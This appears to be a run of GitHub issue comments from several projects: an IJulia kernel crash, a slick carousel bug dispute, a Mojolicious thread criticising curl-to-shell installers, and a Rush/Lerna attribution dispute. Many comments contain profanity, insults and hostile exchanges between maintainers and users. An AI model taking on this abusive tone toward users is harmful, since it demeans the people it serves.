Writing IJulia kernelspec to /root/.julia/v0.4/IJulia/deps/julia-0.4/kernel.json ...
Installing julia kernelspec julia-0.4
[InstallKernelSpec] Installed kernelspec julia-0.4 in /root/.local/share/jupyter/kernels/julia-0.4
```

After reloading a page, Julia is not actually added as a kernel in JupyterHub, so I suspect there is something else still broken. 
"
3579	"> Trying again is a ridiculous solution.

I totally agree and I think that should be fixed.
"
3580	"@yuyichao OK, now Julia 0.4.1 is listed, except it crashes instantly. 
"
3581	"https://github.com/JuliaLang/IJulia.jl#debugging-ijulia-problems
"
3582	"> If IJulia is crashing (e.g. it gives you a ""kernel appears to have died"" message), you can modify it to print more descriptive error messages to the terminal: edit your IJulia/src/IJulia.jl file (in your .julia package directory) to change the line verbose = false at the top to verbose = true and const capture_stderr = true to const capture_stderr = false. Then restart the kernel or open a new notebook and look for the error message when IJulia dies

""look for the error message"". And where would that be? I don't see anything remotely resembling a useful error message. 
"
3583	"OK, so, I found the error message:

```
ERROR: could not open file /root/.julia/v0.4/IJulia/src/kernel.jl
 in include at ./boot.jl:261
 in include_from_node1 at ./loading.jl:304
 in process_options at ./client.jl:280
 in _start at ./client.jl:378
```
"
3584	"I can `cat` the contents of that file as the user running the server, so... now we are at the point that my shell can do something Julia cannot. Excellent!
"
3585	"In that case, what's the permission of `/root/.julia/v0.4/IJulia/src/kernel.jl` and do you see the same error when running `julia /root/.julia/v0.4/IJulia/src/kernel.jl` ?
"
3586	"@yuyichao -rw-r--r-- 1 root root, the second command works fine. The server also runs as root. 
"
3587	"@aragnon: please reference the [Julia Community Standards](http://julialang.org/community/standards/). 

I understand that problems are frustrating, but your language and general rudeness in this issue is unproductive and not acceptable in the Julia Community. I assure you that @yuyichao is very kindly helping you in spite of your vitriol, and not because of it. Turning around and calling suggestions ""idiotic"" is certainly not very motivating for others who might otherwise want to help.

If you want help and to offer constructive criticism that's great and very welcome, but in return please be respectful in the future.
"
3588	"@yuyichao OK, I fixed it myself already. It basically just comes down that the ""kernel"" runs as whatever user is logged in, which is not root. So, it's just a matter of installing a kernel in a system wide fashion. The error reporting could be orders of magnitude better. 
"
3589	"@ssfrr You don't get respect for delivering stuff which does not work, sorry. That's not how it works.
"
3590	"@ssfrr And, to add to that, I intensely hate people who point at ""community standards"". 
"
3591	"> the ""kernel"" runs as whatever user is logged in, which is not root

I suppose this is due to jupyter hub and that's a very reasonable thing to do.

If you want to install IJulia system wide, you can have a look at my PKGBUILD for ArchLinux at https://github.com/yuyichao/arch-pkg/blob/master/pkg/all/ijulia-git/PKGBUILD . I agree it's a little twisted because julia dosesn't have a super good out-of-the-box support for system wise package installation yet.
"
3592	"@yuyichao Yeah, I understand the situation, so thanks for the helping hand, but I can probably fix the rest myself. 
"
3593	"@aragnon, you're asking people to donate free technical support to you; you might want to re-consider your attitude.
"
3594	"I think you are the one who does not get who is providing a free service to who.

> Op 9 dec. 2015 om 18:13 heeft Steven G. Johnson notifications@github.com het volgende geschreven:
> 
> @aragnon, you're asking people for free technical support; you might want to re-consider your attitude.
> 
> —
> Reply to this email directly or view it on GitHub.
"
3595	"There is no possibility of positive future interaction in this issue, so let's just leave things here.
"
3596	"What version are you using. Also, please follow Contributing.md
"
3597	"Whatever the latest version is, being advertised on your website.

> On 20 Oct 2014, at 15:17, Ken Wheeler notifications@github.com wrote:
> 
> What version are you using. Also, please follow Contributing.md
> 
> —
> Reply to this email directly or view it on GitHub https://github.com/kenwheeler/slick/issues/681#issuecomment-59764209.
"
3598	"Just tested on an actual iPad. Not happening.
"
3599	"Wow, is this seriously how you deal with issues? How incredibly arrogant.

Unfortunately, I cannot test at this point on an actual device, but I have no reason to think that the iOS simulator is any different.

And so obviously there is something else that may be causing this, as human courtesy I would have expected you to maybe be interested to at least offer some kind of help.

But just for your information, you can close tickets as much as you want, but if I feel as though it hasn’t been properly dealt with, I’ll keep on re-opening them until you actually start being helpful.

So on your iPad, what is the behaviour? Do they swipe and scroll and not activate the links until the slider has stopped?

> On 20 Oct 2014, at 15:29, Ken Wheeler notifications@github.com wrote:
> 
> Closed #681 https://github.com/kenwheeler/slick/issues/681.
> 
> —
> Reply to this email directly or view it on GitHub https://github.com/kenwheeler/slick/issues/681#event-180904141.
"
3600	"Your issue was closed because you failed to follow CONTRIBUTING.markdown. And if you keep opening issues, I'll keep closing them. How do you expect me to debug your issue if you fail to provide even basic details like OS version, device version, and your markup and slick settings?

And then when I ask for it, you call me arrogant? Sure thing boss, I'll give you the money you spent on this plugin back. 

I have a newborn, a full time job, and a life. I don't have time to take guesses at what your issue might be, and I'm giving this plugin away and supporting it for free. Every second I spend explaining to you why you need to file legitimate bug reports is a second I dont get to spend making money or with my family.

So stop being a fucking 9 year old, READ CONTRIBUTING.markdown, and fill your fucking issue out like a big boy.
"
3601	"Btw, if you continue to talk shit:

https://help.github.com/articles/blocking-a-user/
"
3602	"Also, to anyone else who uses this plugin who had to read this tripe, I'm sorry. Sometimes people need to hear the truth.
"
3603	"@kenwheeler :clap: 
"
3604	"Just to add something to this, I have reported you to GitHub, and explained why i hadn't seemed to provide your information.

I'm sure if you took a step back, and saw this from my point of view, you'd realise you were incredibly hasty in your comments, and language.

You should have shown some customer courtesy at the very least.
"
3605	"Awesome @leecollings, I'm sure Github will tell one of their top 100 repos to start being nice to the guy who files illegitimate issues and then calls the owner arrogant. Good luck with that. Go pay $14 to use Royal Slider so you can go legitimately give someone a hard time.
"
3606	"At the end of the day Ken, you’re the one in the wrong here purely because of the way you’ve been speaking.

If you had simply asked me questions like what OS etc, in a nice manner then I would have given you all the information you asked for.

Instead of that your response of ‘Works fine. not happening’. And then closure of the bug, is just totally uncalled for and is simply unhelpful.

Regardless of whether you’re charging or not.. you’re still providing a service to a customer essentially. And what comes with that should always be a certain level of customer service, even when people don’t strictly follow your rules.

It’s common business sense.

But still, thanks for your ‘support’.

> On 20 Oct 2014, at 15:50, Ken Wheeler notifications@github.com wrote:
> 
> Awesome @leecollings https://github.com/leecollings, I'm sure Github will tell one of their top 100 repos to start being nice to the guy who files illegitimate issues and then calls the owner arrogant. Good luck with that. Go pay $14 to use Royal Slider so you can go legitimately give someone a hard time.
> 
> —
> Reply to this email directly or view it on GitHub https://github.com/kenwheeler/slick/issues/681#issuecomment-59769591.
"
3607	"Yeah except this isn't a business. It's the best slider plugin there is. And I'm giving it away for free.

I did ask nicely for the details. I even said please. 

Then, after you ignored me the first time, I even went and tried to verify your issue, when you clearly didn't give a fuck about reading the contribution guidelines. I verified that it's not a bug, based upon the information(none) that you gave me. I took time out of my day, after you ignored me, to check on the issue anyway.

And then you called me arrogant.

I haven't done anything wrong. You're in my house right now pal. Locate somewhere in here where I've done something wrong:

https://help.github.com/articles/github-terms-of-service/

Done? Yeah I didn't think so. I don't care what kind of service you think your entitled to, but you aren't. Funny thing is, if you provided details now, I would still look into it.

But you appear to be more focused on talking shit like an entitled little brat.

If you respond again, and its not a goddamn stellar issue report, you're getting blocked.

At that point, you can go learn javascript and write your own plugin.
"
3608	"@leecollings you are a fool.
"
3609	"For what, exactly?

> On 20 Oct 2014, at 16:12, Sam Thompson notifications@github.com wrote:
> 
> @leecollings https://github.com/leecollings you are a fool.
> 
> —
> Reply to this email directly or view it on GitHub https://github.com/kenwheeler/slick/issues/681#issuecomment-59775448.
"
3610	"Very relevant to this conversation: https://twitter.com/izs/status/523572549066567680 

Also, @leecollings you call yourself a customer, you are very funny! What was the amount of the last check you sent to @kenwheeler ?

Keep up the good work @kenwheeler !
"
3611	"You’re making the misconception that being a customer always relates to money.

Just because there’s no money involved, doesn’t mean it’s any different to the regular ‘supplier/consumer’ link.

If a muffin shop decides to give away free muffins, are they still customers? Yes, they are.

> On 20 Oct 2014, at 16:21, Ghislain Seguin notifications@github.com wrote:
> 
> Very relevant to this conversation: https://twitter.com/izs/status/523572549066567680 https://twitter.com/izs/status/523572549066567680
> Also, @leecollings https://github.com/leecollings you call yourself a customer, you are very funny! What was the amount of the last check you sent @kenwheeler https://github.com/kenwheeler ?
> 
> Keep up the good work @kenwheeler https://github.com/kenwheeler !
> 
> —
> Reply to this email directly or view it on GitHub https://github.com/kenwheeler/slick/issues/681#issuecomment-59778303.
"
3612	"@leecollings,

http://bit.ly/1t5kBna

**cus·tom·er**
/'kəstəmər/
_noun_
1. a person or organization that buys goods or services from a store or business.
"
3613	"@gseguin +1
"
3614	"That’s actually incorrect.

> On 20 Oct 2014, at 16:32, Ken Wheeler notifications@github.com wrote:
> 
> @gseguin https://github.com/gseguin +1
> 
> —
> Reply to this email directly or view it on GitHub https://github.com/kenwheeler/slick/issues/681#issuecomment-59780207.
"
3615	"![wat](http://i0.kym-cdn.com/photos/images/newsfeed/000/173/576/Wat8.jpg?1315930535)
"
3616	"How do you call a definition from a dictionary incorrect?
"
3617	"@leecollings The problem here is your perception that @kenwheeler owes you something. The reality is the fact that he made something and then said you could use it for free. He's tried to help you when you asked for help. So now you are complaining that he isn't being nice when you refuse to help him the way he asks for help. What's wrong with you? Why do you feel like you're so important?
"
3618	"That’s not how it is at all. The ‘problem’ I have, is that he seems to think he was offering to help, when he was being rude and arrogant.

If it was me, and someone came to me with a problem, I’d be as friendly as I possibly can to find out what’s going wrong. I certainly wouldn’t respond with ‘It’s working fine on mine. Not a problem’.

To literally refuse to acknowledge that there’s even an issue, is the bad practice here.

He hasn’t tried to help, he’s responded by swearing, and being aggressive and then complaining that I haven’t given specific information. Information, which I would have completely given to him, had he asked for it. Since I didn’t know what information he wanted, how could I have supplied it?

And as for the supporting.md or whatever it is, I wasn’t aware I had to read there.. It doesn’t say that anywhere. What I know, is there’s a tab on the right saying ‘Issues’, and there you can post issues.

Don’t blame me for that.

> On 20 Oct 2014, at 16:37, Jonathan Yarbor notifications@github.com wrote:
> 
> @leecollings https://github.com/leecollings The problem here is your perception that @kenwheeler https://github.com/kenwheeler owes you something. The reality is the fact that he made something and then said you could use it for free. He's tried to help you when you asked for help. So now you are complaining that he isn't being nice when you refuse to help him the way he asks for help. What's wrong with you? Why do you feel like you're so important?
> 
> —
> Reply to this email directly or view it on GitHub https://github.com/kenwheeler/slick/issues/681#issuecomment-59781163.
"
3619	"> Information, which I would have completely given to him, had he asked for it.

![wat](http://i.imgur.com/711GK3x.png)
"
3620	"@leecollings You have to be the most deserved to be blocked user in the history of online communities.

![screen shot 2014-10-20 at 12 44 01 pm](https://cloud.githubusercontent.com/assets/5664/4704127/f4eba90e-586f-11e4-9e4d-8ed7599ef990.png)
"
3621	"Then maybe the issue is that you haven't seen the vertical scrollbar on the homepage of the project to scroll down to the `contributing` section. I'll help you with that: https://github.com/kenwheeler/slick#contributing
"
3622	"> He hasn’t tried to help

Funny because, despite you not following my rules and completely disregarding my request for information, I STILL took time out of my day to open my dev environment up, run a server and test it on an iPad, confirming I couldn't reproduce the issue with the details I was given.
"
3623	"Clearly I’ve pointed out quite a big flaw in your ‘community’.

But I’m also quite upset that you all seem very quick to jump on the bandwagon rather than to attempt to provide support to those in need.

If anyone wishes to block me, go ahead. I’m not going to lose any sleep over it.

And I’m certainly not the most deserved to be blocked user. I’ve come across people who just respond with incoherent language, and profanity.

I haven’t been out of place at all here, and will never be like that. As soon as you start swearing in a conversation, you’ve lost the argument anyway.

> On 20 Oct 2014, at 16:45, Ghislain Seguin notifications@github.com wrote:
> 
> Then maybe the issue is that you haven't seen the vertical scrollbar on the homepage of the project to scroll down to the contributing section. I'll help you with that: https://github.com/kenwheeler/slick#contributing https://github.com/kenwheeler/slick#contributing
> —
> Reply to this email directly or view it on GitHub https://github.com/kenwheeler/slick/issues/681#issuecomment-59782603.
"
3624	"And the way you dealt with it, was not helpful. I would appreciate that you acknowledge and accept that Ken.

> On 20 Oct 2014, at 16:47, Ken Wheeler notifications@github.com wrote:
> 
> He hasn’t tried to help
> 
> Funny because, despite you not following my rules and completely disregarding my request for information, I STILL took time out of my day to open my dev environment up, run a server and test it on an iPad, confirming I couldn't reproduce the issue with the details I was given.
> 
> —
> Reply to this email directly or view it on GitHub https://github.com/kenwheeler/slick/issues/681#issuecomment-59783013.
"
3625	"@leecollings You should read first the contributing.md file before submit a PR or a Issue, even Github display a message at the top of page. If you do not read them, at least post you configuration, library version, and browser versions.
"
3626	"@leecollings The only contributions you ever make on Github are issues. It's clear you don't understand how Github works outside of people doing stuff for free, just for you. I agree to a point that @kenwheeler could have been nicer to how he responded to your inqury, but this isn't a McDonalds where service comes with a smile. Furthermore he asked you to comply with a simple format in your issue and YOU IGNORED HIM. You actually ignored him first and is the likely cause of the attitude in the first place. 
"
3627	"Well I wasn’t aware of this, because I don’t believe it’s ever mentioned.

Like I said, I go by what I can see, like most users. I saw the ‘Issues’ tab, and the ability to post them.

Like I have done previously in GitHub, and have never had an issue like this.

> On 20 Oct 2014, at 16:50, Fernando Montoya notifications@github.com wrote:
> 
> @leecollings https://github.com/leecollings You should read first the contributing.md file before submit a PR or a Issue, even Github display a message at the top of page. If you do not read them, at least post you configuration, library version, and browser versions.
> 
> —
> Reply to this email directly or view it on GitHub https://github.com/kenwheeler/slick/issues/681#issuecomment-59783420.
"
3628	"> he’s responded by swearing, and being aggressive

Actually, from the start I was nice and even said please. Hear me out. I try and keep this carousel rock solid because I know people depend on it. That means that when issues get reported, they are very important to me. That also means that when I have to waste time asking people to write proper issues, or fight with them over shit, it's time that could be spent working on actual issues, making the plugin better.

In regards to swearing, what are you my mom? I didn't curse until you called me arrogant. I didn't start this buddy, you did.
"
3629	"@leecollings His first response asked you to follow the guidelines.
"
3630	"No I didn’t ignore him, he didin’t directly ask me for anything. He complained that I hadn’t provided anything. There’s a difference in that.

If he were to offer to help in a kind way, and ask for bits of info, then I Would gladly still provide information to him.

And the comment about my activity on GitHub isn’t really relevant. GitHub happens to be the place people are directed to to post issues about certain things. That’s not my fault is it?

> On 20 Oct 2014, at 16:52, Jonathan Yarbor notifications@github.com wrote:
> 
> @leecollings https://github.com/leecollings The only contributions you ever make on Github is issues. It's clear you don't understand how Github works outside of people doing stuff for free, just for you. I agree to a point that @kenwheeler https://github.com/kenwheeler could have been nicer to how he responded to your inqury, but this isn't a McDonalds where service comes with a smile. Furthermore he asked you to comply with a simple format in your issue and YOU IGNORED HIM. You actually ignored him first and is the likely cause of the attitude in the first place.
> 
> —
> Reply to this email directly or view it on GitHub https://github.com/kenwheeler/slick/issues/681#issuecomment-59783791.
"
3631	"@leecollings Look at this screenshot. This is him asking you for something.
![upload 1](https://cloud.githubusercontent.com/assets/93261/4704386/a8ad5c02-5871-11e4-822c-b8af9dfcd83c.png)
"
3632	"@leecollings Can you stop complaining and just post your problem in the right way? Forget it, get over youself.
"
3633	"You know @leecollings, if you got back to me, right now, with a proper bug report. I'd still look into it. Not because I care about you, because I don't, but because I care about slick.
"
3634	"And for what it's worth @leecollings, I'm sorry for cursing at you. I'm from New Jersey, we do that to each other.
"
3635	"I accept your apology.

And for the other comment, maybe it’s just me, but that sounded very much like a ‘in the future’ kind of comment.

> On 20 Oct 2014, at 16:58, Ken Wheeler notifications@github.com wrote:
> 
> And for what it's worth @leecollings https://github.com/leecollings, I'm sorry for cursing at you. I'm from New Jersey, we do that to each other.
> 
> —
> Reply to this email directly or view it on GitHub https://github.com/kenwheeler/slick/issues/681#issuecomment-59784863.
"
3636	"@leecollings So you can ask for things, but he can't? And then you're upset because he ignored you? wow
"
3637	"Let me wait until I get home, and then I will properly test with my actual iPhone, rather than create a wasteful bug report if it’s just the iOS simulator. (Although I’m confident it’s the best iOS simulator around).

But thanks anyway.

> On 20 Oct 2014, at 16:58, Ken Wheeler notifications@github.com wrote:
> 
> And for what it's worth @leecollings https://github.com/leecollings, I'm sorry for cursing at you. I'm from New Jersey, we do that to each other.
> 
> —
> Reply to this email directly or view it on GitHub https://github.com/kenwheeler/slick/issues/681#issuecomment-59784863.
"
3638	"No, you clearly haven’t read what’s been said.

I’ve said many times that I would happily give out information, when I’m asked for it.

> On 20 Oct 2014, at 17:03, Jonathan Yarbor notifications@github.com wrote:
> 
> @leecollings https://github.com/leecollings So you can ask for things, but he can't? And then you're upset because he ignored you? wow
> 
> —
> Reply to this email directly or view it on GitHub https://github.com/kenwheeler/slick/issues/681#issuecomment-59785775.
"
3639	"@leecollings He didn't JUST*\* ask for information. He asked you to follow guidelines when creating the bug report. There is a big difference here.
"
3640	"@leecollings when you post issues on repos it's pretty common to give OS info, device info, browser info, and the code you were using. ""Whatever the latest version is"" is hardly enough information.
"
3641	"I can see how it may not include much information, but it is a valid answer to the question.

And like I’ve previously said, I’m not aware how common it is to provide such info straight away without being asked for it, as I’ve posted issues before and have never had anything like this returned back to me.

Which just makes me believe, it’s just the kind of people here. Sadly, not that friendly it seems.

> On 20 Oct 2014, at 17:09, Christopher McCullough notifications@github.com wrote:
> 
> @leecollings https://github.com/leecollings when you post issues on repos it's pretty common to give OS info, device info, browser info, and the code you were using. ""Whatever the latest version is"" is hardly enough information.
> 
> —
> Reply to this email directly or view it on GitHub https://github.com/kenwheeler/slick/issues/681#issuecomment-59786772.
"
3642	"@leecollings Either a crowd of random people are ""unfriendly"" or perhaps you need to review how your causing people to treat you based off your own actions. It seems like you have this attitude that nothing you do could ever be at fault or wrong.
"
3643	"@leecollings When everybody else is the problem, sometimes it makes sense to go ahead and take a look in the ol' mirror my man.
"
3644	"Or possibly that so many people these days have forgotten what common courtesy is.

Can we stop now?

> On 20 Oct 2014, at 17:15, Ken Wheeler notifications@github.com wrote:
> 
> @leecollings https://github.com/leecollings When everybody else is the problem, sometimes it makes sense to go ahead and take a look in the ol' mirror my man.
> 
> —
> Reply to this email directly or view it on GitHub https://github.com/kenwheeler/slick/issues/681#issuecomment-59791220.
"
3645	"@leecollings Sure thing gentlesir. Just update m'issue on m'repo and we'll get it looked at.
"
3646	"@leecollings 

> Well I wasn’t aware of this, because I don’t believe it’s ever mentioned. Like I said, I go by what I can see, like most users. I saw the ‘Issues’ tab

Umm....

![screen shot 2014-11-15 at 9 58 10 am](https://cloud.githubusercontent.com/assets/150330/5058248/fbbb3414-6cad-11e4-954a-5b10a4bdc729.png)
"
3647	"Jesus, trolls gonna troll hard!
"
3648	@kmmbvnr bump :icecream: 
3649	"Sorry, I don't think that the ReadTheDocs website is well suited for the things like tutorials.

Thanks for notes. I made few changes in the google docs."
3650	"Our opinions differ here.
I think it's not possible to collaborate on the google docs easily unless you provide specific access to some people directly. I consider that a tutorial is only a section of the documentation. I personally didn't see the link to the google docs at first so I was very confused and I find read the docs more convenient and clean.

* Easier to collaborate, everybody can suggest a PR
* We can keep track of the modifications
* There's a table of content! :)
* We can add more documentation (easily)

It could also be some markdown in a folder in the project or a wiki on Github. I recommended read the docs based on the fact that many python projects use it.
My main concern was collaboration here"
3651	Please, more documentation!
3652	"@kmmbvnr can you reconsider this with #351 ? I still think this would be a good improvement to the project and it would make it more accessible for anyone.

If you think rtfd is not the right solution here, let me know why and what we could do to get this merged. I'm always looking for ways to improve myself as a developer and I'd like to know what went wrong here.
I know it's been a while, but I really like this project and I feel like more documentation can't hurt.
Thanks for your time"
3653	I agree, django-jenkins should use Sphinx / readthedocs for all documentation as it's standard for python projects. It allows for collaboration and keeps the documentation close to the code.
3654	"Please adjust your attitude before participating in the development of Mojolicious.
"
3655	"""Please adjust your attitude...""

Answer my questions first. You're facilitating in the cultural diffusion of a very bad habit that I've been trying to get developers out of ever since I heard of composer.

""... before participating in the development of Mojolicious.""

Oh excuse me your highness. Here I was just asking questions to discern what your reasoning was for engaging in such abhorrent practices, and you tell me I'm only allowed to help your project if I say it in a way that pleases you?

Blow me.
"
3656	"Summary of the above:
1. Person is driving through a school zone at 100mph.
2. Police officer: WTF IS WRONG WITH YOU DO YOU WANT TO KILL KIDS?
3. Person is like ""I'll need you to calm down before I let you write me a ticket.""
"
3657	"Holy christ, yo.

Discussions of tone-policing and project-management aside, please consider the OP's comments (whether you can stomache his tone, or not.) This _is_ a horrible practice that needs to stop spreading.
"
3658	"I agree with ELLIOTTCABLE; this is a pretty severe and nasty security problem that has the potential to lead to Very Bad Things. Whether or not you like the tone is irrelevant to the merit of the bug; in this case, double-redirects and in-the-clear HTTP combined with cargo-cult shell instructions merit some very careful consideration and--in my opinion--a very fast fix.
"
3659	"(I wouldn't say irrelevant, @Dr-Syn; the right of a project owner to run their project how they will is inviolable. Not saying I think it indicates a very _good_ project manager, but …)
"
3660	"@ELLIOTTCABLE Which is why I specified ""to the merit of the bug"" ;-) Tone of the report really doesn't have a bearing on whether or not the bug exists; while politeness is nice and to be encouraged, dismissing a report out of hand because you don't like the wording is...not.
"
3661	"I agree it's a bad practice as well, but that's also why I don't use it... or have considered using anything similar to it. Piping something from the internet to sh ... it really gives me the chills.

Unfortunately junk like this is market driven. People think it's a good idea to have one-liner cuteness over any potential badness.  So ... the best thing we can do is teach people not to trust commands like this and then projects will stop promoting it since no one will use it.  Until then ... 
"
3662	"At the heart of it, I feel like the OP dismissed the suggestion of GitHub when opening the issue to read the contributing guide, which has the section http://mojolicio.us/perldoc/Mojolicious/Guides/Contributing#Reporting-security-issues

> Please report security issues directly to the CPAN email address of the pumpkin-holder, which is currently sri@cpan.org, and give us a few days to develop and release a proper fix.
"
3663	"@dougwilson It was too late for that, even before the issues was posted. It was publicly disclosed on HN.

https://news.ycombinator.com/item?id=8095830 - 14 hours ago
"
3664	"I'm not going to reward this behavior with answers. Anyone who truly cares is welcome to open a new issue and ask in a civil manner, and i will explain why most changes we could do would simply be security theatre.
"
3665	"""I'm not going to reward this behavior with answers.""

Because you don't have any?

""Anyone who truly cares is welcome to open a new issue and ask in a civil manner, and i will explain why most changes we could do would simply be security theatre.""

That's a vapid statement. In any given situation ""most changes we could do would simply be security theatre"", but there are a subset of ""all possible changes we could do"" that would actually lead to increased security. That is why I referenced this article in the OP: https://defuse.ca/triangle-of-secure-code-delivery.htm

PGP signatures, reproducible builds, and userbase consistency verification -> win.
HTTP redirect + HTTP redirect on a different domain + Github raw over HTTPS -> lost.

What will you do if someone hijacks one of the two domains, loads it up with a MitM proxy, and trojans the build script to append an attacker's public key to `~/.ssh/authorized_keys`? You have no plan. Dismissing the suggestions of someone who's trying to help because you don't like my (tone|attitude|.+?) isn't helping anyone. 
"
3666	"@sarciszewski I'm locking this issue now, should you decide to start over with a new issue, please be nice, or i will be forced to ban you permanently from the project.
"
3667	"@sarciszewski why don't you do that to prove your point?
"
3668	"Hey, thanks Martin. I just saw the threads this morning.

I'm not aware of any deliberate copying of the Lerna code, but let me dig into it now and call all the devs on the team to be sure. If there is, we should definitely give correct attribution, so I want to investigate. Do we have any links pointing to similar code between the two that I can take a look at?

Do you think it might be good if I explained some of the differences between Rush and other similar monorepo tools like Lerna, Yarn workspaces, pnpm, etc and why they are different? They are all useful tools but all a bit different, too."
3669	"Thanks for getting back to me on a Sunday. Much appreciated.  Not been able to find similar code yet. If anyone can - please dump some links into here for me.  @pgonzal if you can check with the team that would be awesome.

Some history would be good I think. Why does Rush exist at all, were you inspired by things like Lerna or Yarn workspaces or the others ones?  Keen to get this cleared up and make sure we are doing the right thing."
3670	I checked with the devs, and nobody's aware of any code coming from Lerna. If we inadvertently used something without credit, I really would like to know so that I can fix it. Please let me know and I’ll get on it right away.
3671	"> I checked with the devs, and nobody's aware of any code coming from Lerna.

It's easy to say ""no"", you know. You should check the code with a diff tool or something. And not just the last version but all commits."
3672	On the [thread](https://threadreaderapp.com/thread/1002696910266773505.html), @jamiebuilds states that the git history was altered after his complaint. That statement is very hard to comfirm or falsify without the repository before the (alleged) alteration. So if nobody pulled a copy (including git history) in the early days, this isn't going to lead nowhere.
3673	"Probably worth a bit of a background in how you tend to spot unattributed code. The diff tool thing often doesn't work that well when looking for code being re-used in another open source project without attribution. Most often when you are doing a forensic code examination, the give-aways tend to be in terms of variable / function name choices, code comments, code structure etc.  Diff tools can easily get fooled by some slight changes, even changes to whitespace in the naive use of the tools. You use tools to get you close to areas that might be similar and then often eyeballing is the best way

The issues I see most often tend to be things like people copy/pasting an answer from StackOverflow and not correctly attributing as well as getting the original authors permission to license under MIT or similar terms rather than the StackOverflow license (which is a whole other discussion). Another frequent place where people forget to attribute is when they are referencing a technical book.  But occasionally you see code flow between projects with a bit of refactoring also.

I have not checked all commits because they are both busy projects and little usually changes between each commit.  Rush has had lots of releases and Lerna over 100 I think with several major restructurings over the way.  I first looked at the latest versions and the initial versions and then took some snapshots from 2017 and 2016. This code was internal in Microsoft for a while before it was refactored to go open source but the changes there were about removing the components they were not releasing as open and renaming from an internal codename to the current naming.

I've had some other people who are experienced in doing forensic code comparisons take a look for me and they can't find anything either. I also got an independent outside consultancy firm who specialize in this type of thing to take a look for me.  They didn't find anything - but I'm going to get them to do a more in-depth scan which will take a bit longer to come back with results.

I've talked with the original copyright holder and the current maintainer and neither have reported any issues.  The original poster has been unable to point me at the issue also - but to be fair, he was busy at the time away from his computer.

So far, I haven't found any evidence of code coming from outside the project without attribution. However, if people have found something please let me know as we would love to find what it is that Jamie feels the Rush project has done wrong and fix it.

The team themselves are very keen to see this resolved as they are proud of the work they do and the effort that went into it."
3674	Hey @pgonzal - would you be able to comment on the history of this project a bit?  How did it start, even if it didn't take any actual code from Lerna - was it heavily inspired by it or the other monorepo tools?
3675	Please stop mentioning me on this issue and contacting me about this, I'm done talking about it since Microsoft employees (Scott Hanselman) have gone out of their way to contact my friends and try to convince them to say shit about me publicly. You guys are assholes, now fuck off.
3676	"> So if nobody pulled a copy (including git history) in the early days, this isn't going to lead nowhere.

This repo does have a few forks that are widely outdated (and diverged in both directions), so unless someone went through the trouble of scrambling their history as well without actually pulling them up to date, they should be useful.

Given that the author making these accusations can't be bothered to (publicly) put some actual proof to their allegations (let alone be civil), I'd personally start ignoring it at this point. If the author went through all the work to compare the repositories to find evidence of this scrambling, I'm sure they checked out the repository, yet are unwilling to make anything public other than a rant on twitter. That's not how you defend your software against alleged theft of intellectual property."
3677	"Hey, sorry Jamie. I'd been deliberately not mentioning you since the initial creation - which was to inform you that I had logged an issue on your behalf and hope that you could explain where the problem is with the project so that we can fix it.

Guess you are getting notifications from GitHub as you were mentioned at the beginning?  There is an 'unsubscribe' button at the top of the issue in GH if you want to mute

![image](https://user-images.githubusercontent.com/856858/40991517-ef4d352c-68eb-11e8-9899-1e1324351ba0.png)

Apologies for the intrusion - just trying to get to the bottom of your issue as we take copyright violations very seriously and would want to fix them immediately."
3678	"Not sure what to say. I wanted to make this right. I haven't ""got out of my way to contact your friends."" I DM'ed one person - the original copyright owner - and said:
![image](https://user-images.githubusercontent.com/2892/41000650-83005d86-68c3-11e8-9ec8-a4540a067a5f.png)
Not to mention LITERALLY:
![image](https://user-images.githubusercontent.com/2892/41000561-3bcf0ce6-68c3-11e8-9722-7f4f882ce2e2.png)
If you feel that is ""[going] out of their way to contact my friends and try to convince them to say shit about me publicly"" then I apologize. I'm just trying to figure out what's up here. I guess there's not much else I can do. "
3679	"> Hey @pgonzal - would you be able to comment on the history of this project a bit? How did it start, even if it didn't take any actual code from Lerna - was it heavily inspired by it or the other monorepo tools?

**A little history:**  

Rush started as an internal closed-source project back in the dark days before we did things in the open. My group was building the SharePoint Framework (SPFx), which is an SDK for third-party developers, and also the foundation for a number of SharePoint applications in Microsoft. Being a large code base, we eventually realized the need to break it up into lots of small packages. And being a constantly evolving platform that was closely coupled with its consumers, we had constant frustration with the familiar one-repo-per-package model of NPM. In fall of 2015 we started moving everything into one repo, and quickly saw the need to automate the install/link/build steps.

We did not know of any other solutions internally, so I started work on an internal tool called ""NPMX"".  My first official commits happened over Christmas holiday. Most of the focus initially was around Rush's centralized symlinking approach which I think is unique among the other NPM monorepo tools. It ensures that NPM packages cannot accidentally import dependencies that aren't listed in their package.json file. (We call those ""phantom dependencies"" as they lead to untested version combinations or module resolution errors.) By the spring of 2016 we were up and running with the core features and even parallel builds, and were shifting focus to the scalability features that would characterize Rush.  But it was all still internal.

SPFx released its first dev preview in August 2016.  Shortly after we stared publishing `@microsoft/npmx` using the proprietary SPFx license (i.e. it was still closed source). Given that NPMX wasn't directly tied to any commercial product, it bothered me that it wasn't usable by the general community.  So we started the process in Microsoft for an open source release, which eventually happened in January 2017.  We had migrated a lot of projects between repos by this point, and were accustomed to bringing along the full Git history. When we do that we use `git filter-branch` to leave out the other projects from the old repo, which in this case were proprietary code (i.e. projects that we were not releasing as open source).  We also renamed ""NPMX"" to ""Rush"" everywhere because the NPMX name was too similar to the NPM tool itself and might confuse people.

**How does Rush compare to Lerna?  Why didn't we abandon Rush or merge it with Lerna?** 

We get this question sometimes. Today, there are several approaches you can use for monorepo management, each with different goals.  For example [Yarn workspaces](https://yarnpkg.com/lang/en/docs/workspaces/) and [PNPM recursive link](https://pnpm.js.org/docs/en/pnpm-recursive.html) both help you to get all your projects symlinked together, but don't get too much into build/publishing orchestration.  We primarily use PNPM with Rush because it solves the NPM [""doppelgangers"" problem](https://medium.com/pnpm/why-should-we-use-pnpm-75ca4bfe7d93) but we don't use its ""PNPM recursive link"" feature.  Lerna integrates with multiple package managers and supplements them with bulk commands for managing lots of projects.  Lerna has a much larger and more active community and a longer list of basic operations than Rush.  To be honest Lerna is also easier to get started with, so I personally recommend it if it meets your needs.

